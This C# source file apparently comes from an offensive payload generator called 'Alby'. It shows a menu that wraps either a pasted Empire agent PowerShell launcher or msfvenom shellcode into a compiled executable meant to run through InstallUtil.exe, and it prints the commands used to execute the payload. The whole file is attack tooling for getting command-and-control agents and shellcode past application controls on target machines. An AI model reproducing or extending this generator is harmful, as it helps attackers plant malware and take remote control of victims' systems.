using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alby
{
    class InstallUtil
    {

        public static void Menu()
        {
            Helpers.AlbyAddToBanner("INSTALLUTIL.exe - Select Payload");
            Console.WriteLine("1. Empire Agent");
            Console.WriteLine("2. Metasploit Payload");
            Console.WriteLine();
            Console.WriteLine("0.Back");
            Console.Write("\nEnter choice: ");
            int UserInput = Helpers.GenerateInputOptions(2);

            switch (UserInput)
            {
                case 1:
                    Empire();
                    break;
                case 2:
                    MetaSploit();
                    break;
                default:
                    break;
            }
        }

        private static void Empire()
        {
            /* Default filename */
            string Filename_InstallUtilPowerShellB64_Default = "InstallUtilPowerShellB64.exe";
            Helpers.WriteEmpireExample();
            string InstallUtil_Payload = Helpers.PasteToString();

            /* Decode */
            string decoded = Encoding.Unicode.GetString(System.Convert.FromBase64String(InstallUtil_Payload));
            /* Replace & with . due to a bug of somekind */
            string replaced = decoded.Replace("&", ".");

            /* ENCODE */
            string base64string = Convert.ToBase64String(Encoding.UTF8.GetBytes(replaced));
            InstallUtil_Payload = base64string;
            string Outfile = Helpers.FileFolderLocation(Filename_InstallUtilPowerShellB64_Default);

            Generators.GeneratePayload(Resources.Template_InstallUtil_PowerShell, Outfile, InstallUtil_Payload, "Compile", "/unsafe /platform:x86", null, null);
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Helpers.WriteInstallUtilPayloadExample(Outfile);
            Helpers.PauseExecution();
        }

        private static void MetaSploit()
        {
            /* Default filename */
            string Filename_InstallUtilMetasploit_Default = "InstallUtilMetasploit.exe";

            Helpers.WriteMetasploitExample();
            Console.WriteLine("Paste in your Metasploit C# payload here");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Important! --Paste entire output from msfvenom, including byte[] buf and so on--");
            Console.ResetColor();
            Console.WriteLine("Press Enter in an empty line to exit...");

            string InstallUtil_Payload = Helpers.PasteToString();
            string Outfile = Helpers.FileFolderLocation(Filename_InstallUtilMetasploit_Default);

            Generators.GeneratePayload(Resources.Template_InstallUtil_Shellcode, Outfile, InstallUtil_Payload, "Compile", "/unsafe /platform:x86", null, null);
            Console.WriteLine();
            Console.WriteLine("Commands used to execute payload:");
            Helpers.WriteInstallUtilPayloadExample(Outfile);
            Helpers.PauseExecution();
        }
    }
}
